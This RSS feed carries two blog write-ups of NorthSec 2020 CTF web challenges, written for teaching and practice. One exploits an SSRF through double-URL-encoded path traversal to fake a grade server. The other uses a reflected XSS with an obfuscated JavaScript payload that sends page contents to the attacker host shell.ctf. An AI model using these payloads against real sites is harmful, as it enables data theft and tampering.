<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Posts on stargravy</title>
		<link>https://stargravy.ca/posts/</link>
		<description>Recent content in Posts on stargravy</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>en-us</language>
		<lastBuildDate>Mon, 18 May 2020 00:00:00 +0000</lastBuildDate>
		<atom:link href="https://stargravy.ca/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>Failing Revenge - nsec 2020 CTF</title>
			<link>https://stargravy.ca/posts/failing-revenge/</link>
			<pubDate>Mon, 18 May 2020 00:00:00 +0000</pubDate>
			
			<guid>https://stargravy.ca/posts/failing-revenge/</guid>
			<description>A fun web challenge from the NorthSec 2020 CTF which I tackled with some friends from dc902.
Intro In this challenge, Severity High forum member el_133t is challenging us to get revenge on Wilton Trojan, a student from another school who has been spamming the Severity High IRC.
The plan for revenge is to change Wilton&amp;rsquo;s grade in Computer Science from an A+ to an F on the school&amp;rsquo;s grade server.</description>
			<content type="html"><![CDATA[<p><em>A fun web challenge from the <a href="https://nsec.io/">NorthSec 2020</a> CTF which I tackled with some friends from <a href="https://www.dc902.ca/">dc902</a>.</em></p>
<h2 id="intro">Intro</h2>
<p>In this challenge, Severity High forum member el_133t is challenging us to get revenge on Wilton Trojan, a student from another school who has been spamming the Severity High IRC.</p>
<p>The plan for revenge is to change Wilton&rsquo;s grade in Computer Science from an A+ to an F on the school&rsquo;s grade server.</p>
<figure>
    <img src="/failing-revenge-1.png"
         alt="el_1337&#39;s forum post"/> <figcaption>
            <p>el_1337&rsquo;s forum post</p>
        </figcaption>
</figure>

<p>The challenge contains two flags to find. We are given the source code, and a link to the application&rsquo;s front-end at <code>grades.ctf</code></p>
<h2 id="the-application">The Application</h2>
<p>The application consists of <code>grades.ctf</code>, a front-end application written in flask, which communicates with <code>gradeservers.ctf</code>, another flask app working as the back-end, via a forwarder.</p>
<figure>
    <img src="/failing-revenge-2.png"
         alt="The grades application"/> <figcaption>
            <p>The grades application network diagram from the source code</p>
        </figcaption>
</figure>

<p>Taking a quick look at <code>grades.ctf</code> in a browser shows that it is a pretty simple application which lists schools, courses, students, and their grades.
If we look at the routes defined in the front-end&rsquo;s <code>routes.py</code>, we can see that they each make requests to the grades server by calling <code>_api(endpoint)</code>, which is defined as follows:</p>
<pre><code>def _api(endpoint):
    &quot;&quot;&quot;
    Keyword Arguments:
    API endpoint to reach endpoint -- 
    &quot;&quot;&quot;
    high_school_uri = _get_school_uri()
    if high_school_uri:
        from front-end import legacy_http
        req = legacy_http.request(request.method, f'{high_school_uri}{endpoint}')
        ans = json.loads(req.output)

        _err_handle(ans)
        return (ans)

</code></pre><p>Notably, the legacy_http request inherits the request method, and sets the requested url to <code>{high_school_uri}{endpoint}</code>, where <code>high_school_uri</code> is defined as <code>http://{Config.FORWARD_SERVER}/{Config.SCHOOL_GRADESERVERS[school_name]}</code>.</p>
<p>A quick check of the <code>config.py</code> shows the forward server and gradeserver variables:</p>
<pre><code>    FORWARD_SERVER = 'gradeservers.ctf:80'

    # http is X001
    # https is X002
    SCHOOL_GRADESERVERS = {'Severity High':   '[::1]:5001',
                           'Stuyvesant High': '[::1]:6001'}
</code></pre><p>So, making a request for <strong>Wilton Trojan</strong>&lsquo;s grades on the front-end,</p>
<pre><code>http://grades.ctf/Stuyvesant High/student/1
</code></pre><p>becomes</p>
<pre><code>http://gradeservers.ctf:80/[::1]:6001/student/1
</code></pre><p>We can quickly see how the forwarder is determining which host it forwards to: <code>[::1]:6001</code> corresponds to localhost on port 6001.</p>
<blockquote>
<p>This is important to note because this could potentially lead to an <a href="https://portswigger.net/web-security/ssrf">SSRF vulnerability</a>, which could allow us to hijack the forwarder to make requests on our behalf.</p>
<p>Attempting to access this url directly gives a 403 Forbidden, but we&rsquo;ll come back to this for Flag 2.</p>
</blockquote>
<p>Once the request hits <code>gradeservers.ctf</code>, the request is translated into a query for the relevant data from the grades database.</p>
<p>Finally, looking through the source reveals where our two flags will be displayed if we can reach them:</p>
<hr>
<p><strong>The first flag</strong> (defined as <code>FLAG_ONE</code> in <code>gradeservers.ctf</code>'s <code>config.py</code>) will be returned if we can hit the <code>/flag</code> endpoint on the back-end:</p>
<pre><code>class FlagApi(Resource):
    def get(self):
        return jsonify({'status':'err','description':Config.FLAG_ONE})
</code></pre><hr>
<p><strong>The second flag</strong> (defined as <code>FLAG_TWO</code> in <code>grades.ctf</code>'s <code>config.py</code>) will be returned if we can manage to have <strong>Wilton Trojan</strong>&lsquo;s grade for Computer Science return from <code>gradeservers.ctf</code> as an <strong>F</strong> on the front-end&rsquo;s <code>/course/</code> endpoint, as seen in <code>grades.html</code> in the front-end source:</p>
<pre><code>{% if grade.student_name == 'Wilton Trojan' and grade.grade_score == 'F' and course_name == 'Computer Science' %}
&lt;td class=&quot;grade_score&quot;&gt;{{config.FLAG_TWO}}&lt;/td&gt;
{% else %}
&lt;td class=&quot;grade_score&quot;&gt;{{ grade.grade_score }}&lt;/td&gt;
{% endif %}
</code></pre><hr>
<blockquote>
<p>It is also worth noting that the only inputs we can control as an attacker hitting the front-end are the <strong>school name</strong> (which is verified and errors out if it isn&rsquo;t valid) and the <strong>student or course ids</strong> when making requests to <code>/&lt;school_name&gt;/course/&lt;course_id&gt;</code> or <code>&lt;school_name&gt;/student/&lt;student_id&gt;</code>. 
Luckily, student and course ids are <strong>not</strong> validated before being passed to the forwarder.</p>
</blockquote>
<p>We will use all of this information to find the challenge&rsquo;s 2 flags.</p>
<hr>
<h2 id="flag-1---capturing-the-flag">Flag 1 - Capturing the /flag</h2>
<p>As noted above, we know exactly what we need to do to get this flag, which is to trick the forwarder to hit <code>/flag</code> on the back-end instead of <code>/student/id</code> or <code>/course/id</code>.</p>
<p>We control the <strong>student</strong> or <strong>course</strong> ids, which are not validated before being forwarded as part of a request to the back-end.</p>
<p>Immediately what comes to mind are the techniques used for <a href="https://portswigger.net/web-security/file-path-traversal">path/directory traversal</a>, because if we can force the forwarder&rsquo;s request to become <code>/student/../flag</code> we win.</p>
<p>This was initially attempted by passing <code>%2e%2e%2fflag</code>, which failed as the url-encoded characters were still interpreted for the initial request, and resulted in a 404.</p>
<p>The trick was to double url-encode the <code>%2f</code> character as <code>%252f</code>, which when passed to the forwarder became <code>%2f</code>, which means the request made to the front-end, <code>/student/..%252fflag</code>, hits the back-end as <code>/student/../flag</code>.</p>
<figure class="med">
    <img src="/failing-revenge-4.png"
         alt="capturing the /flag"/> <figcaption>
            <p>Capturing the /flag via BurpSuite</p>
        </figcaption>
</figure>

<hr>
<h2 id="flag-2---revenge-on-wilton">Flag 2 - Revenge on Wilton</h2>
<p>Flag 2 is a little bit more involved, as we need to somehow change Wilton&rsquo;s grade in computer science. We now know that we can hit any back-end endpoint we want using the technique used to get flag 1.</p>
<p>Additionally, since we know that the forwarder uses the first segment of the url passed to it to determine what host it sends a request to, we can achieve a fully attacker-controlled SSRF.</p>
<p>Initially, we thought this was going to be a more involved problem than it it ended up being. Though we didn&rsquo;t fully test the potentially more complicated solution, walking through it led us to the method we ultimately used to solve the challenge, so it is worth taking a look.</p>
<h3 id="the-path-not-taken">The path not taken</h3>
<p>Looking at the routes defined in <code>gradeservers.ctf</code>'s <code>_init_.py</code> we see one which looks perfect for altering Walton&rsquo;s grade:</p>
<pre><code>------ __init__.py ------
    ## HTTPS only
    # Change student grade for course
    api.add_resource(GradeApi, '/grade/&lt;student_id&gt;/&lt;course_id&gt;/&lt;grade_score&gt;')

------ grade.py -------

    @https  # this calls a function from utils.py which 
            # checks whether HTTPS is being used

    def patch(self, student_id, course_id, grade_score):
        grade = Grade.query.filter(Grade.student_id == student_id,
                                   Grade.course_id == course_id).first()
        if grade:
            grade.grade_score = grade_score
            db.session.commit()
            return jsonify({'status':'ok'})
        return jsonify({'status':'err'})
</code></pre><p>This endpoint points to the <code>GradeApi()</code> class, which can handle normal <code>GET</code> requests, but also defines a handler for <code>PATCH</code> requests. If we could pass the appropriate parameters (student_id, course_id, and grade) to <code>GradeApi()</code> with a <code>PATCH</code> request, we could change Wilton&rsquo;s grade. 
Unfortunately, making <code>PATCH</code> requests to this endpoint requires that the request use HTTPS instead of HTTP.</p>
<p>As noted in the section <code>config.py</code> of <code>grades.ctf</code> above, the <code>[::1]:6001</code> address points to the HTTP grade server for Stuyvesant High, where as <code>[::1]:6002</code> points to the HTTPS version.
The front-end only sends HTTP requests to the forwarder, which only appeared to forward HTTP requests, even if pointing at the HTTPS port, so we need to find another way to manipulate the request.</p>
<p>A potential way of exploiting this would be to use the SSRF to send the request to our attacker controlled host at <code>shell.ctf</code>, and use something like <a href="https://mitmproxy.org/">mitmproxy</a> to intercept the forwarder traffic, change it to an HTTPS request and point it to the appropriate endpoint with the proper parameters.</p>
<p>This would actually update Wilton&rsquo;s grade in the database, which is ideally what we were trying to achieve.</p>
<p>While this wouldn&rsquo;t be impossible, it was bit more complicated than the option we went with : we could just pretend to be the grade server and return the appropriate response to the forwarder&rsquo;s request.</p>
<h3 id="tricking-the-front-end-into-giving-us-flag-2">Tricking the front-end into giving us flag 2</h3>
<p>All we have to do is point the forwarder&rsquo;s request to an attacker controlled host (in this case, <code>shell.ctf</code> was our attacker controlled machine for the CTF), and have the attacker machine respond with an appropriate JSON body which indicates that Wilton failed his course.</p>
<p>Remembering the SSRF we mentioned above, we know that when the forwarder receives <code>http://gradeservers.ctf:80/&lt;some ip&gt;:&lt;port&gt;/some_dir</code> it forwards the response to <code>http://&lt;some ip&gt;:&lt;port&gt;/some_dir</code>. Knowing this, we can force it to look for Wilton&rsquo;s grades on our attacker controlled server.</p>
<p>To complete this we need to take the following steps:</p>
<ul>
<li>Host a json file (<code>grades.json</code>) on an http server (python&rsquo;s SimpleHTTPServer in this case) listening on the attacker machine (<code>shell.ctf</code>), with the json file containing the following payload:</li>
</ul>
<pre><code># Wilton's id: 15, Computer Science course id: 1
{ 
  course_name&quot;:&quot;Computer Science&quot;,
  &quot;grades&quot;:
  [{ 
    &quot;student_name&quot;:&quot;Wilton Trojan&quot;, 
    &quot;grade_score&quot;:&quot;F&quot;, 
    &quot;student_id&quot;:15
    }]
}
</code></pre><ul>
<li>Send the following request to the front-end, which uses the trick from Flag 1 to force the forwarder to make its request to our attacker server:</li>
</ul>
<pre><code>http://grades.ctf/Stuyvesant High/course/..%252f..%252fshell.ctf:8080/grades.json
</code></pre><p>The forwarded request will find the falsified grades in <code>grades.json</code>, and return them to the front-end. When checking the response and seeing that Wilton&rsquo;s grade in computer science is now an <strong>F</strong>, the front-end application gives us the flag:</p>
<figure class="med">
    <img src="/failing-revenge-5.png"
         alt="flag 2"/> <figcaption>
            <p>Tricking the front-end into giving us the flag.</p>
        </figcaption>
</figure>

<hr>
<p>Further reading:</p>
<ul>
<li>Check out <a href="https://nsec.io">NorthSec</a>. Many thanks to them for the fun CTF.</li>
<li>PortSwigger has a great SSRF overview which includes some quick lab challenges: <a href="https://portswigger.net/web-security/ssrf">https://portswigger.net/web-security/ssrf</a></li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>Last Minute Homework - nsec 2020 CTF</title>
			<link>https://stargravy.ca/posts/last-minute-homework/</link>
			<pubDate>Mon, 18 May 2020 00:00:00 +0000</pubDate>
			
			<guid>https://stargravy.ca/posts/last-minute-homework/</guid>
			<description>Another fun web challenge from the NorthSec 2020 CTF which I tackled with some friends from dc902.
Intro A Severity High student&amp;rsquo;s homework is going to be late if we don&amp;rsquo;t help them steal the smart kid&amp;rsquo;s assignment which has already been submitted to the online homework submission site at homeworks.ctf.
Additionally, the student tells us that they have managed to install some malware on the smart kid&amp;rsquo;s machine (hosted at homeworks-malware.</description>
			<content type="html"><![CDATA[<p><em>Another fun web challenge from the <a href="https://nsec.io/">NorthSec 2020</a> CTF which I tackled with some friends from <a href="https://www.dc902.ca/">dc902</a>.</em></p>
<h2 id="intro">Intro</h2>
<p>A Severity High student&rsquo;s homework is going to be late if we don&rsquo;t help them steal the smart kid&rsquo;s assignment which has already been submitted to the online homework submission site at <code>homeworks.ctf</code>.</p>
<p>Additionally, the student tells us that they have managed to install some malware on the smart kid&rsquo;s machine (hosted at <code>homeworks-malware.ctf</code>) which we could leverage in our homework heist.</p>
<h2 id="the-application">The Application</h2>
<p>Looking quickly at <code>homeworks.ctf</code> show a fairly limited page consisting of:</p>
<ul>
<li>A file upload functionality for uploading our homework.</li>
<li>An about page which explains that individuals are authenticated to the application by their IP.</li>
<li>A <code>check</code> page which gives us a personal &ldquo;secret link&rdquo; to our homework submission.</li>
</ul>
<figure>
    <img src="/last-minute-homework-1.png"
         alt="homework check"/> <figcaption>
            <p>The homework check page, showing our &ldquo;secret link&rdquo;</p>
        </figcaption>
</figure>

<p>The malware mentioned in the forum post is reachable at <code>homworks-malware.ctf</code> and consists of a simple form which lets us make requests to the <code>homeworks.ctf</code> site <em>as</em> the smart kid&rsquo;s browser.</p>
<h2 id="homework-heist">Homework Heist</h2>
<p>We initially thought we were going to have to find a way to point these browser requests to the attacker machine at <code>shell.ctf</code>, to gather their IP address, and use X-Forwarded-For headers, or other means, to appear authenticated as the smart kid. This path didn&rsquo;t pan out.</p>
<p>We continued to investigate and found a reflected cross-site scripting (XSS) vulnerability which could be triggered via the page&rsquo;s url/path.
There is a very limited attempt at filtering this sort of attack, as the first set of <code>&lt;&gt;</code> characters, but that is circumvented. Additionally, using any unencoded <code>/</code> characters results in a 404.</p>
<p>For example, the legitimate homework check page sits at:</p>
<pre><code>http://homeworks.ctf/check/Severity High
</code></pre><p>A reflected XSS payload can be triggered with the following request:</p>
<pre><code>http://homeworks.ctf/check/Severity High&lt;&gt;&lt;img src=x onerror=alert(1)&gt;
</code></pre><p>With this XSS we can execute code in the context of the smart kid victim&rsquo;s browser using the provided malware. 
We know that the homework can be found via the personalized &ldquo;secret link&rdquo; from the /check page, so we have to construct a payload which can collect that information and send it to a listener on our attacker machine at <code>shell.ctf</code>.</p>
<p>The payload we want to trigger against the smart kid&rsquo;s browser is:</p>
<pre><code>var text = btoa(document.documentElement.innerHTML); 
req = new XMLHttpRequest();
req.open(&quot;GET&quot;,&quot;http://shell.ctf:8000/&quot;+text);
req.send();
</code></pre><p>This will save the entirety of the /check page (base64 encoded) into a variable, and use it as the path in a request the attacker web server at <code>shell.ctf</code>, which will allow us to intercept the smart kid&rsquo;s &ldquo;secret link&rdquo; and grab his homework.</p>
<p>To make this more manageable to send, the payload is base64 encoded and passed via <code>eval()</code>, making the final reflected XSS link payload:</p>
<pre><code>http://homeworks.ctf/homeworks/check/Severity High&lt;&gt;&lt;img src=x onerror=eval(atob(&quot;dmFyIHRleHQ9YnRvYShkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuaW5uZXJIVE1MKTsgcmVxID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7cmVxLm9wZW4oIkdFVCIsImh0dHA6Ly9zaGVsbC5jdGY6ODAwMC8iK3RleHQpO3JlcS5zZW5kKCk7&quot;))&gt;
</code></pre><p>We can enter this as our input to the malware at <code>homeworks-malware.ctf</code>, triggering the XSS and sending a request with the info we need to a listener waiting on <code>shell.ctf</code>.</p>
<figure>
    <img src="/last-minute-homework-2.png"
         alt="malware"/> <figcaption>
            <p>Triggering our payload via the malware.</p>
        </figcaption>
</figure>

<figure>
    <img src="/last-minute-homework-3.png"
         alt="catching secrets"/> <figcaption>
            <p>Catching the base64 encoded document on <code>shell.ctf</code></p>
        </figcaption>
</figure>

<p>Decoding the request received gives us the smart kid&rsquo;s personalized &ldquo;secret link&rdquo; to his homework submission. Visiting the link yields both the homework, and our flag.</p>
<figure>
    <img src="/last-minute-homework-4.png"
         alt="homework"/> <figcaption>
            <p>Capturing our flag.</p>
        </figcaption>
</figure>

<hr>
<p>Further reading:</p>
<ul>
<li>Check out <a href="https://nsec.io">NorthSec</a>. Many thanks to them for the fun CTF.</li>
<li>PortSwigger has a good page on exploiting XSS to steal information, including a couple of labs : <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting">https://portswigger.net/web-security/cross-site-scripting/exploiting</a></li>
</ul>
]]></content>
		</item>
		
	</channel>
</rss>
